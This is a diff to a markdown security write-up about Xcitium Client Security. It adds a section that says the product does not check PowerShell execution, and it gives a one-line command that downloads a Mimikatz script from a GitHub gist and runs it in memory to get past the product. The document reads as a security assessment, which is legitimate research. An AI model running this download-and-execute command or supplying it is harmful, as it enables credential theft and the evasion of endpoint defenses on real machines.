@@ -45,3 +45,15 @@ Note: in the screenshot at I encoded in Base64 to be in just one line.
 ![](<../Xcitium Client Security/Images/ps-pl-success1.png>)
 
 ![](<../Xcitium Client Security/Images/ps-pl-success2.png>)
+
+## Running Mimikatz
+
+As discussed above about the lack of concern with the execution of commands via Powershell by Client Security, a simple command to load Mimikatz via Powershell is enough.
+
+Command:
+
+```
+iex(wget https://gist.github.com/pich4ya/e93abe76d97bd1cf67bfba8dce9c0093/raw/e32760420ae642123599b6c9c2fddde2ecaf7a2b/Invoke-OneShot-Mimikatz.ps1 -UseBasicParsing)
+```
+
+![](<../Xcitium Client Security/Images/mimikatz-bypass.png>)
